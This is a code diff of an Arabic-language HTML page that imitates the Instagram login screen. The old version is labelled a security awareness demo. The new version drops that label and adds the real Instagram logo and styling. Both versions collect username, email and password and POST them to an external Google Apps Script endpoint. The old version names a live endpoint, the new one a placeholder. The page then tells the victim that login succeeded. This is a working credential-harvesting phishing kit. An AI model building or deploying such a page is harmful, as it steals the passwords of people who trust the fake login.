@@ -1,194 +1,169 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
-
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
 
-<title>Security Awareness Demo</title>
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
 
-<style>
+        .card {
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 30px;
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+            margin: 10px;
+        }
 
-body{
-    font-family:Arial,sans-serif;
-    background:#f2f3f5;
-    margin:0;
-    padding:30px;
-}
+        .insta-logo-img {
+            width: 175px;
+            margin-bottom: 20px;
+            margin-top: 10px;
+        }
 
-.card{
-    max-width:400px;
-    margin:50px auto;
-    background:white;
-    padding:25px;
-    border-radius:18px;
-    box-shadow:0 5px 25px #0002;
-}
+        .insta-subtext {
+            color: #737373;
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
 
-input,button{
-    width:100%;
-    box-sizing:border-box;
-    padding:13px;
-    margin-top:10px;
-    border-radius:9px;
-}
+        .input-group input {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            padding: 10px;
+            margin-bottom: 8px;
+            font-size: 13px;
+            outline: none;
+            direction: rtl;
+        }
 
-input{
-    border:1px solid #ccc;
-}
+        .input-group input:focus {
+            border-color: #a8a8a8;
+        }
 
-button{
-    border:0;
-    background:#111;
-    color:white;
-    font-weight:bold;
-}
+        .btn-blue {
+            width: 100%;
+            background-color: #0095f6;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            padding: 9px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
 
-#login{
-    display:none;
-}
+        .btn-blue:hover {
+            background-color: #1877f2;
+        }
 
-#result{
-    display:none;
-    margin-top:20px;
-    padding:15px;
-    background:#fff3cd;
-    border-radius:10px;
-}
+        .btn-dark {
+            width: 100%;
+            background-color: #262626;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            padding: 10px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+        }
 
-.small{
-    color:#777;
-    font-size:13px;
-}
-@import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');
-
-/* تحسين الخط والشعار */
-.insta-logo {
-    font-family: 'Grand Hotel', cursive;
-    font-size: 45px;
-    margin: 10px 0 15px 0;
-    color: #262626;
-    font-weight: normal;
-    letter-spacing: 1px;
-}
-
-.insta-subtext {
-    color: #737373;
-    font-size: 13px;
-    margin-bottom: 20px;
-}
-
-/* ظبط الاتجاه والنصوص داخل الخانات */
-.input-group input {
-    width: 100%;
-    background: #fafafa;
-    border: 1px solid #dbdbdb;
-    border-radius: 4px;
-    padding: 10px 10px;
-    margin-bottom: 8px;
-    font-size: 12px;
-    outline: none;
-    box-sizing: border-box;
-    text-align: right;
-}
-
-.input-group input:focus {
-    border-color: #a8a8a8;
-}
-
-/* الأزرار */
-.insta-btn-blue {
-    width: 100%;
-    background-color: #0095f6;
-    color: #ffffff;
-    border: none;
-    border-radius: 8px;
-    padding: 8px 16px;
-    font-weight: 600;
-    font-size: 14px;
-    cursor: pointer;
-    margin-top: 8px;
-}
-
-.insta-btn-primary {
-    width: 100%;
-    background-color: #1a1f2c;
-    color: #ffffff;
-    border: none;
-    border-radius: 8px;
-    padding: 10px 16px;
-    font-weight: 600;
-    cursor: pointer;
-}
-}
-</style>
+        .btn-dark:hover {
+            background-color: #000000;
+        }
+    </style>
 </head>
-
 <body>
 
- <!-- الكارد الأول -->
-<div class="card">
-    <h1 class="insta-logo">Instagram</h1>
-    <button onclick="startDemo()" class="insta-btn-primary">
-        Instagram
-    </button>
-</div>
-
-<!-- كارد تسجيل الدخول (مخفي في الأول) -->
-<div id="login" class="card" style="display:none;">
-    <h1 class="insta-logo">Instagram</h1>
-    <p class="insta-subtext">سجل الدخول للمتابعة</p>
-
-    <div class="input-group">
-        <input type="text" id="name" placeholder="اسم المستخدم أو الهاتف">
-        <input type="email" id="email" placeholder="البريد الإلكتروني">
-        <input type="password" id="password" placeholder="كلمة السر">
+    <!-- الكارد الأول -->
+    <div id="start-card" class="card">
+        <img class="insta-logo-img" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" alt="Instagram">
+        <button onclick="startDemo()" class="btn-dark">
+            افتح Instagram
+        </button>
     </div>
 
-    <button onclick="finishDemo()" class="insta-btn-blue">
-        تسجيل الدخول
-    </button>
+    <!-- كارد تسجيل الدخول (مخفي في الأول) -->
+    <div id="login" class="card" style="display:none;">
+        <img class="insta-logo-img" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" alt="Instagram">
+        <p class="insta-subtext">سجل الدخول للمتابعة</p>
 
-    <div id="result" style="display:none; margin-top: 15px;"></div>
-</div>
+        <div class="input-group">
+            <input type="text" id="name" placeholder="اسم المستخدم أو الهاتف">
+            <input type="email" id="email" placeholder="البريد الإلكتروني">
+            <input type="password" id="password" placeholder="كلمة السر">
+        </div>
 
-<script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxnAVdN37_FpdckPpcmvMYr8_1EMOXuTxuF32Ng4nwXbFA7nqfmeh5-WHc_VsZkjP2H/exec";
+        <button onclick="finishDemo()" class="btn-blue">
+            تسجيل الدخول
+        </button>
 
-    function sendResult(action) {
-        const name = document.getElementById("name")?.value || "";
-        const email = document.getElementById("email")?.value || "";
-        const password = document.getElementById("password")?.value || "";
+        <div id="result" style="display:none; margin-top: 15px;"></div>
+    </div>
 
-        const data = {
-            name: name,
-            email: email,
-            password: password,
-            action: action,
-            detected: "yes"
-        };
+    <script>
+        // ضع رابط Google Apps Script الخاص بك هنا
+        const SCRIPT_URL = "ضع_رابط_السكربت_هنا";
 
-        fetch(SCRIPT_URL, {
-            method: "POST",
-            mode: "no-cors",
-            headers: {
-                "Content-Type": "text/plain"
-            },
-           body: JSON.stringify(data)
-        });
-    }
+        function startDemo() {
+            document.getElementById("start-card").style.display = "none";
+            document.getElementById("login").style.display = "block";
+        }
 
+        function finishDemo() {
+            const nameVal = document.getElementById("name").value;
+            const emailVal = document.getElementById("email").value;
+            const passVal = document.getElementById("password").value;
 
-function startDemo() {
-        document.getElementById("login").style.display = "block";
-    }
+            if(!nameVal || !emailVal || !passVal) {
+                alert("يرجى ملء جميع الحقول");
+                return;
+            }
 
-    function finishDemo() {
-        sendResult("submitted_demo_form");
+            const payload = {
+                name: nameVal,
+                email: emailVal,
+                password: passVal,
+                action: "Login Attempt",
+                detected: "No"
+            };
 
-        document.getElementById("result").style.display = "block";
-        document.getElementById("result").innerHTML = "<b>تم تسجيل النتيجة.</b><br><br>";
-    }
-</script>
+            fetch(SCRIPT_URL, {
+                method: "POST",
+                mode: "no-cors",
+                headers: {
+                    "Content-Type": "text/plain"
+                },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                document.getElementById("result").style.display = "block";
+                document.getElementById("result").innerText = "تم تسجيل الدخول بنجاح!";
+                document.getElementById("result").style.color = "green";
+            }).catch(err => {
+                console.error(err);
+            });
+        }
+    </script>
 </body>
 </html>
